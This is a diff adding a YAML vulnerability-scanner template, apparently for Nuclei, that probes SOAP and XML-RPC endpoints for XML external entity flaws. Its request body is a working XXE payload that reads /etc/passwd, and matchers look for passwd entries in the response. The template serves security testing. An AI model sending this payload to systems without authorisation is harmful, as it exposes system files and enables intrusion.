@@ -1,0 +1,37 @@
+id: xxe-soap-xml
+info:
+  name: XXE in SOAP/XML-RPC Endpoints
+  author: AniipID
+  severity: critical
+  description: Detects XXE vulnerabilities in SOAP web service endpoints
+  tags: xxe,soap,xml-rpc,webservice
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/soap"
+      - "{{BaseURL}}/soap/service"
+      - "{{BaseURL}}/xmlrpc"
+      - "{{BaseURL}}/api/xmlrpc"
+    headers:
+      Content-Type: text/xml
+      SOAPAction: ""
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <foo>&xxe;</foo>
+        </soap:Body>
+      </soap:Envelope>
+    matchers:
+      - type: word
+        words:
+          - "root:x:0"
+          - "bin:x:1"
+          - "daemon:x:2"
+          - "nobody:x:"
+        condition: or
+        part: body
